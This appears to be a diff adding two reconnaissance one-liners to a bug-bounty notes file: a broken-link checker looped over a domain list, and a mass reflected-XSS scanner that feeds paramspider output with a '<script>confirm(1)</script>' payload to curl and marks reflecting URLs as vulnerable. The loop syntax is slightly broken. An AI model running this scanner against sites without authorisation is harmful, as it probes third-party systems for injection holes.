@@ -1,1 +1,5 @@
+Broken Links
 for host in $(cat domains);do blc https://$host -ro |grep BROKEN| awk -v host=$host '{print host, $2, $3}' ;done > broken_links
+
+Param Spiser for XSS
+for i in $(cat recursive_domains);do paramspider -d $i --subs false --placeholder '"/><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done >> vulnerable_xss.txt ;done
